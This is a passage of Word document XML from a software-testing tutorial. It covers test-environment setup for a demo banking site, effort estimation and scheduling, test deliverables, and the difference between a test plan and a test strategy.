        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="216" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>How to setup the Test Environment</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Back to your project, how do you set up </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>test environment</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> for this banking website?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>To finish this task, you need </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a strong cooperation</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> between Test Team and Development Team</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You should ask the developer some questions to understand the web application under test </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>clearly</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>. Here’re some recommended questions. Of course, you can ask the other questions if you need.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E"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What is the maximum user connection which this website can handle at the same time?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E"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What are hardware/software requirements to install this website?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">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Does the user's computer need any particular setting to browse the website?</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Following figure describes the test environment of the banking website </w:t>
      </w:r>
      <w:hyperlink r:id="rId147" w:history="1">
        <w:r w:rsidRPr="00E97930">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="0000FF"/>
          </w:rPr>
          <w:t>www.demo.guru99.com/V4</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="216" w:lineRule="atLeast"/>
        <w:outlineLvl w:val="3"/>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lastRenderedPageBreak/>
        <w:t>Step 7) Schedule &amp; Estimation</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In the article </w:t>
      </w:r>
      <w:hyperlink r:id="rId148" w:history="1">
        <w:r w:rsidRPr="00E97930">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="40A2B5"/>
          </w:rPr>
          <w:t>Test estimation</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>, you already used some techniques to estimate the effort to complete the project. Now you should include that estimation as well as the schedule to the Test Planning</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 xml:space="preserve">In the Test Estimation phase, suppose you break out the whole </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>project into small tasks and add</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t xml:space="preserve"> the estimation for each task as below</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="8804" w:type="dxa"/>
        <w:tblInd w:w="-67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0"/>
        <w:gridCol w:w="1662"/>
        <w:gridCol w:w="4962"/>
      </w:tblGrid>
      <w:tr w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidTr="008E672E">
        <w:trPr>
          <w:trHeight w:val="163"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2180"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Task</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1662"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Members</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4962" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="DDDDDD"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="auto"/>
              <w:bottom w:val="outset" w:sz="2" w:space="0" w:color="auto"/>
              <w:right w:val="outset" w:sz="2" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>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b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>Estimate effort</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidTr="008E672E">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Create the test specification</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Designer</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170 man-hour</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidTr="008E672E">
        <w:trPr>
          <w:trHeight w:val="163"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2180"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Perform Test Execution</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="16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Tester, Test Administrator</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="49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80 man-hour</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidTr="008E672E">
        <w:trPr>
          <w:trHeight w:val="163"/>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Report</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Tester</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10 man-hour</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidTr="008E672E">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Delivery</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="16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 </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4962" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="DDDDDD"/>
              <w:left w:val="outset" w:sz="2" w:space="0" w:color="auto"/>
              <w:bottom w:val="outset" w:sz="2" w:space="0" w:color="auto"/>
              <w:right w:val="outset" w:sz="2" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="F9F9F9"/>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20 man-hour</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidTr="008E672E">
        <w:trPr>
          <w:trHeight w:val="156"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2180"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Total</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="16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color w:val="343434"/>
              </w:rPr>
              <w:t> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4962" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="DDDDDD"/>
              <w:left w:val="outset" w:sz="2" w:space="0" w:color="auto"/>
              <w:bottom w:val="outset" w:sz="2" w:space="0" w:color="auto"/>
              <w:right w:val="outset" w:sz="2" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:tcMar>
              <w:top w:w="92" w:type="dxa"/>
              <w:left w:w="92" w:type="dxa"/>
              <w:bottom w:w="92" w:type="dxa"/>
              <w:right w:w="92" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="008E672E">
            <w:pPr>
              <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="230" w:lineRule="atLeast"/>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280 man-hour</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>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Then you create the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>schedule</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> to complete these tasks.</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Making schedule is a common term in project management. By creating a solid schedule in the Test Planning, the Test Manager can use it as tool for monitoring the project progress, control the cost overruns.</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To create the project schedule, the Test Manager needs several types of input as below:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E"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Employee and project deadline</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>: The working days, the project deadline, resource availability are the factors which affected to the schedule</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E"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Project estimation</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>:  Base</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t xml:space="preserve"> on the estimation, the Test Manager knows how long it takes to complete the project. So he can make the appropriate project schedule</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">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 xml:space="preserve">Project </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>Risk </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t xml:space="preserve"> Understanding the risk helps Test Manager add enough extra time to the project schedule to deal with the risks</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>.</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Let’s practice with an example:</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Suppose the boss wants to complete the project Guru99 in </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>one</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> month, you already estimated the effort for each tasks in Test Estimation. You can create the schedule as below</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noProof/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3C7167E6" wp14:editId="65ABC828">
            <wp:extent cx="5943600" cy="171913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943600" cy="1719136"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="216" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>Step 8) Test Deliverables</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Test Deliverables is a list of all the documents, tools and other components that has to be developed and maintained in support of the testing effort.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>There are different test deliverables at every phase of the software development lifecycle.</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before</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> testing phase.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E"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plans document.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E"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cases documents</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">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Design specifications.</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during</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> the testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E"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Scripts</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E"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Simulators.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E"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Data</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E"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Traceability Matrix</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">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Error logs and execution logs.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:p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Test deliverables are provided </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>after</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> the testing cycles is over.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E"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Test Results/reports</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E"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Defect Report</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E"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color w:val="343434"/>
        </w:rPr>
        <w:t>Installation/ Test procedures guidelines</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">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43434"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>Release notes</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t xml:space="preserve">Test Strategy </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>Vs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t xml:space="preserve"> Test Plan</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="216" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="343434"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="343434"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>What is Test Plan?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="343434"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="343434"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>A test plan is defined as a document which outlines the scope, objective, method and weight on a software testing task.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="216" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="343434"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="343434"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>What is Test Strategy?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="343434"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="343434"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Test strategy is defined as a set of guiding principle that enlightens test design &amp; regulates how testing needs to be done</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="343434"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="343434"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Test Plan V/s Test Strategy is a prominent confusion among multiple levels of QA Aspirants</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="343434"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="343434"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Below is the detailed guide to it</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="343434"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="343434"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="343434"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
